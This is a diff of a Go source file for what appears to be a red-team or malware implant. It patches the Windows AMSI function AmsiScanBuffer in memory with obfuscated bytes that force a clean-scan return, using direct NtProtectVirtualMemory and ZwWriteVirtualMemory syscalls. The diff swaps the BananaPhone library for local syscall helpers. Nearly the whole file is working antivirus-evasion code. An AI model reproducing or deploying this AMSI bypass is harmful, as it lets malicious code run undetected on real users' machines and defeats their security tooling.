@@ -1,25 +1,15 @@
 package core
 
-/*
-
-References:
-https://github.com/Ne0nd0g/merlin-agent/blob/master/os/windows/pkg/evasion/evasion.go
-https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-
-*/
-
 import (
   "fmt"
   "unsafe"
   "syscall"
-
-  bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
 )
 
 var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}
 
 func PatchAmsi() (error) {
-  err := WriteBanana("amsi.dll", "AmsiScanBuffer", &amsi_patch)
+  err := WriteBytes("amsi.dll", "AmsiScanBuffer", &amsi_patch)
   if err != nil {
     return err
   }
@@ -27,24 +17,20 @@ func PatchAmsi() (error) {
   return nil
 }
 
-func WriteBanana(module string, proc string, data *[]byte) error {
+func WriteBytes(module string, proc string, data *[]byte) error {
+
   target := syscall.NewLazyDLL(module).NewProc(proc)
   err := target.Find()
   if err != nil {
     return err
   }
   
-  banana, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+  ZwWriteVirtualMemory, err := GetSysId("ZwWriteVirtualMemory")
   if err != nil {
     return err
   }
-	
-  ZwWriteVirtualMemory, err := banana.GetSysID("ZwWriteVirtualMemory")
-	if err != nil {
-    return err
-  }
 
-  NtProtectVirtualMemory, err := banana.GetSysID("NtProtectVirtualMemory")
+  NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
   if err != nil {
     return err
   }
@@ -53,7 +39,7 @@ func WriteBanana(module string, proc string, data *[]byte) error {
   numberOfBytesToProtect := uintptr(len(*data))
   var oldProtect uint32
 
-  ret, err := bananaphone.Syscall(
+  ret, err := Syscall(
     NtProtectVirtualMemory,
     uintptr(0xffffffffffffffff),
     uintptr(unsafe.Pointer(&baseAddress)),
@@ -65,7 +51,7 @@ func WriteBanana(module string, proc string, data *[]byte) error {
     return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
   }
 
-  ret, err = bananaphone.Syscall(
+  ret, err = Syscall(
     ZwWriteVirtualMemory,
     uintptr(0xffffffffffffffff),
     target.Addr(),
@@ -77,7 +63,7 @@ func WriteBanana(module string, proc string, data *[]byte) error {
     return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
   }
 
-  ret, err = bananaphone.Syscall(
+  ret, err = Syscall(
     NtProtectVirtualMemory,
     uintptr(0xffffffffffffffff),
     uintptr(unsafe.Pointer(&baseAddress)),
